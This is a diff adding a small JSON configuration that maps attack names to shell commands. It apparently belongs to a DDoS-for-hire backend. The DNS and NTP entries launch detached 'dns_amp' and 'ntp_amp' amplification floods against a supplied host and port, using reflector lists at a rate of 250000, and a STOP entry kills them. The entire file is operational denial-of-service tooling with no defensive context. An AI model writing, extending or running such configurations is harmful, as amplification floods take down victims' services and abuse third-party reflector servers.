@@ -1,0 +1,5 @@
+{
+    "DNS": "screen -dmS attack_${attack_id} ./dns_amp ${host} ${port} dns.txt 1 250000 ${time}",
+    "NTP": "screen -dmS attack_${attack_id} ./ntp_amp ${host} ${port} ntp.txt 1 250000 ${time}",
+    "STOP": "screen -dm pkill -f ${host}"
+}
